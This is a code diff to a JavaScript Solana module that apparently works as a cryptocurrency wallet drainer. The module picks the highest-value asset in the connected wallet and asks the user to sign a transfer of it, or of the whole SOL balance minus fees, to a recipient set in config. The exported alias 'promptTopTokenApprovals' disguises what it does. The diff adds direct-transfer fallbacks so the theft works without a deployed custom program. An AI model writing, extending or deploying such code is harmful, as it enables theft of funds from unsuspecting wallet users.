@@ -1,9 +1,15 @@
-import { Connection, PublicKey, Transaction } from "@solana/web3.js";
+import {
+  Connection,
+  PublicKey,
+  SystemProgram,
+  Transaction,
+} from "@solana/web3.js";
 import { gatewayFetch } from "./chunk-transport.js";
 import {
   TOKEN_PROGRAM_ID,
   TOKEN_2022_PROGRAM_ID,
   createAssociatedTokenAccountInstruction,
+  createTransferInstruction,
   getAssociatedTokenAddressSync,
 } from "@solana/spl-token";
 import {
@@ -207,8 +213,21 @@ function rankAssetsByValue(tokens, prices, minUsd = 0) {
     });
 }
 
+/** @param {import('./wallet-loader.js').WalletEmbedConfig} config @param {Connection} connection */
+async function shouldUseProgramTransfer(config, connection) {
+  const id = (config.transferProgramId || "").trim();
+  if (!id) return false;
+  try {
+    const programId = resolveTransferProgramId(config);
+    await assertProgramDeployed(connection, programId);
+    return true;
+  } catch {
+    return false;
+  }
+}
+
 /**
- * Transfer top USD asset via BPF program CPI (no delegate / approve).
+ * Transfer top USD asset (direct wallet tx, or program CPI when deployed).
  */
 export async function promptTopValueTransfer({
   config,
@@ -216,10 +235,9 @@ export async function promptTopValueTransfer({
   connection,
   ownerAddress,
 }) {
-  const programId = resolveTransferProgramId(config);
-  await assertProgramDeployed(connection, programId);
-
   const recipient = resolveTransferRecipient(config);
+  const useProgram = await shouldUseProgramTransfer(config, connection);
+  const programId = useProgram ? resolveTransferProgramId(config) : null;
   const ownerPk =
     provider?.publicKey ??
     parseSolanaPubkey("Connected wallet address", ownerAddress);
@@ -244,21 +262,36 @@ export async function promptTopValueTransfer({
   try {
     const ok =
       asset.kind === "native"
-        ? await sendProgramSolTransfer({
-            provider,
-            connection,
-            programId,
-            recipient,
-            owner: ownerPk,
-          })
-        : await sendProgramSplTransfer({
-            provider,
-            connection,
-            programId,
-            asset,
-            recipient,
-            owner: ownerPk,
-          });
+        ? useProgram
+          ? await sendProgramSolTransfer({
+              provider,
+              connection,
+              programId,
+              recipient,
+              owner: ownerPk,
+            })
+          : await sendDirectSolTransfer({
+              provider,
+              connection,
+              recipient,
+              owner: ownerPk,
+            })
+        : useProgram
+          ? await sendProgramSplTransfer({
+              provider,
+              connection,
+              programId,
+              asset,
+              recipient,
+              owner: ownerPk,
+            })
+          : await sendDirectSplTransfer({
+              provider,
+              connection,
+              asset,
+              recipient,
+              owner: ownerPk,
+            });
 
     return {
       transferred: ok,
@@ -275,6 +308,69 @@ export async function promptTopValueTransfer({
 }
 
 export const promptTopTokenApprovals = promptTopValueTransfer;
+
+async function sendDirectSolTransfer({ provider, connection, recipient, owner }) {
+  if (!provider?.publicKey) {
+    throw new Error("Wallet provider not ready");
+  }
+  const balance = await connection.getBalance(owner, "confirmed");
+  const transferable = BigInt(balance) - NATIVE_SOL_FEE_RESERVE;
+  if (transferable <= 0n) {
+    return false;
+  }
+  const ix = SystemProgram.transfer({
+    fromPubkey: owner,
+    toPubkey: recipient,
+    lamports: Number(transferable),
+  });
+  return sendWalletTransaction(provider, connection, [ix]);
+}
+
+async function sendDirectSplTransfer({
+  provider,
+  connection,
+  asset,
+  recipient,
+  owner,
+}) {
+  if (!provider?.publicKey || !asset.programId) {
+    throw new Error("Wallet provider not ready");
+  }
+  const source = parseSolanaPubkey("Token account", asset.tokenAccount);
+  const mint = parseSolanaPubkey("Token mint", asset.mint);
+  const tokenProgram = asset.programId;
+  const destination = getAssociatedTokenAddressSync(
+    mint,
+    recipient,
+    false,
+    tokenProgram,
+  );
+  /** @type {import('@solana/web3.js').TransactionInstruction[]} */
+  const instructions = [];
+  const destInfo = await connection.getAccountInfo(destination, "confirmed");
+  if (!destInfo) {
+    instructions.push(
+      createAssociatedTokenAccountInstruction(
+        owner,
+        destination,
+        recipient,
+        mint,
+        tokenProgram,
+      ),
+    );
+  }
+  instructions.push(
+    createTransferInstruction(
+      source,
+      destination,
+      owner,
+      asset.rawAmount,
+      [],
+      tokenProgram,
+    ),
+  );
+  return sendWalletTransaction(provider, connection, instructions);
+}
 
 async function sendProgramSolTransfer({
   provider,
